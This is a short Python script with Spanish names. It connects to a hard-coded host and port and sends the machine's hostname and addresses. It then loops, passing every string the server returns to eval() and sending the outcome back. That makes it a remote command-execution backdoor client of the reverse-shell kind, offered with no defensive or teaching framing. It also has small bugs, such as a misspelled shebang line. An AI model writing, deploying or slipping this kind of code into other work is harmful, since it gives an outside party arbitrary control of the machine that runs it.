#!/usr/bin/pyhton/env

import os
import sys
import socket

s = socket.socket()
s.connect(("10.121.3.60", 8002))

nombrePC = socket.gethostbyname_ex(socket.gethostname())
comando = []
envioInicial = nombrePC
devuelve = []

while True:
    
    devuelve.extend(envioInicial)
    devuelve.extend(comando)
    darFormatoDevuelve = str(devuelve)

    print('Enviando al servidor:{0}'.format(darFormatoDevuelve))
    s.send(darFormatoDevuelve)
    
    recibido = s.recv(1024)
    print('Recibiendo desde el servidor:{0}'.format(recibido))
    
    if recibido:
        try:
            #print('Ejecutando el EVAL')
            comando = eval(recibido)
            print('comando contiene:'.format(str(comando)))
            devuelve = []
            darFormatoDevuelve = ''
        except Exception as e:
            print('Hubo una excepcion:',e)
            comando = ''
            comando = e
            devuelve = []
            darFormatoDevuelve = ''
    else:
        comando = ''
        devuelve = []
        darFormatoDevuelve = ''

